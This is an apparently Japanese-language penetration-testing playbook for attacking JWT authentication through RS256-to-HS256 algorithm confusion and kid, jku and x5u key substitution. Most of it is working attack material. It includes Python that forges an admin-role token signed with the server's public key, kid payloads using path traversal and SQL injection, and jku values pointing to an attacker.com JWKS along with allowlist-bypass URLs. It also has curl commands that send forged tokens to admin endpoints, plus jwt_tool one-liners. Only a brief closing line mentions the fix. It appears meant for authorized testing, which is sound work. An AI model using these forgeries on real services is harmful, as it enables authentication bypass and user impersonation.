# JWT Algorithm Confusion (RS256 → HS256 / kid / jku / x5u)

`testing-jwt-token-security` の Phase 2 から呼ばれる、非対称署名 → HMAC への alg 取り替え経路と kid / jku / x5u 経由の鍵差し替え攻撃を扱う。

## いつ切替えるか

- API が RS256 / ES256 などの非対称署名 JWT を使い、JWKS や公開鍵が取得できる
- JWT header の `alg` をサーバが信用している疑いがある (実装が generic な `verify(token, key)` を呼んでいる)
- `kid` / `jku` / `x5u` header が JWT に含まれ、鍵の選択ロジックが攻撃面に見える

## Phase 1 — token と公開鍵の取得

```bash
echo $JWT | cut -d. -f1 | base64 -d 2>/dev/null
echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null
```

公開鍵入手経路:

```
GET /.well-known/jwks.json
GET /.well-known/openid-configuration → jwks_uri
GET /oauth/token_key                    # Spring Security 既定
GET /api/public-key                    # 独自実装で稀
TLS cert (証明書 chain で署名鍵がそこにある稀ケース)
```

JWKS から RSA 公開鍵を PEM に変換する手順は jwt_tool / Python `cryptography` で機械化:

```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
import base64
n = int.from_bytes(base64.urlsafe_b64decode(jwk['n'] + '=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(jwk['e'] + '=='), 'big')
pem = RSAPublicNumbers(e, n).public_key().public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
```

## Phase 2 — alg confusion (RS256 → HS256)

ロジック: サーバが `verify(token, key)` 呼出しで key として「常時 RSA 公開鍵 PEM」を渡し、`alg` を JWT header から取るとき、攻撃者が `alg=HS256` に書き換えて公開鍵 PEM を HMAC 秘密鍵として用いて再署名すると、サーバの HMAC 検証が同じ鍵で成立してしまう。

```python
import hmac, hashlib, base64, json

header = {"alg": "HS256", "typ": "JWT"}
payload = {**original_payload, "role": "admin"}

def b64(x): return base64.urlsafe_b64encode(x).decode().rstrip('=')

h = b64(json.dumps(header, separators=(',',':')).encode())
p = b64(json.dumps(payload, separators=(',',':')).encode())
sig = hmac.new(public_key_pem, f"{h}.{p}".encode(), hashlib.sha256).digest()
forged = f"{h}.{p}.{b64(sig)}"
```

公開鍵の format が複数試行に値する:

```
1. PEM 全文 (BEGIN/END 行込み、改行込み)
2. 改行除去版 (\n を \\n リテラルに置換した文字列)
3. base64 部分のみ (BEGIN/END 除去 + 改行除去)
4. DER バイナリ
5. JWK のままの JSON 文字列
6. n / e の hex
```

サーバ実装によりどれが効くかは異なるので、6 種類を順に試す。

## Phase 3 — kid 注入

`kid` が DB / ファイル lookup に使われている場合:

```
{"alg":"HS256","kid":"../../../../../dev/null","typ":"JWT"}
→ 鍵が空ファイル → HMAC 鍵が空文字 → 空鍵で署名できる

{"alg":"HS256","kid":"' UNION SELECT 'secret' --","typ":"JWT"}
→ kid が SQL に渡る場合の SQLi (鍵を任意値にできる)

{"alg":"HS256","kid":"https://attacker.com/x","typ":"JWT"}
→ URL から鍵を取得する実装の SSRF / 任意鍵置換
```

## Phase 4 — jku / x5u 注入

`jku` (JWK Set URL) を信用するサーバなら、攻撃者ホストの JWKS を指す URL に置換:

```
{"alg":"RS256","kid":"atk1","jku":"https://attacker.com/jwks.json","typ":"JWT"}
```

attacker 側で生成した RSA 鍵ペアの公開鍵を `https://attacker.com/jwks.json` に配置し、対応する秘密鍵で signing。

URL allowlist の bypass:

```
https://attacker.com/x@target/.well-known/jwks
https://target/.well-known/jwks#@attacker.com/x
https://target.attacker.com/x       (subdomain trick)
```

`x5u` も同様の論理 (X.509 cert URL)。

## Phase 5 — 検証

forged token を `Authorization: Bearer` で投げて応答を確認:

```bash
curl -i -H "Authorization: Bearer $FORGED" https://target/api/me
curl -i -H "Authorization: Bearer $FORGED" https://target/api/admin
```

200 が返れば成立。403 なら role 部分の調整 (role/sub/aud/iss) を変えて再試行。

## Phase 6 — 自動化

```
jwt_tool $JWT -X k -pk public.pem        # alg confusion (k=key confusion)
jwt_tool $JWT -X kid                     # kid injection
jwt_tool $JWT -X jku -ju https://atk/x   # jku injection
```

burp の `JWT Editor` extension は GUI で同等手順を実行できる。

## Phase 7 — PoC と影響

```
- 取得した public key の location
- alg confusion で受け入れられた forged token (header / payload を redact)
- 影響 (admin endpoint への到達 / 任意ユーザ impersonation)
- 修正 (alg を サーバ側で固定 / library 側 enforce)
```
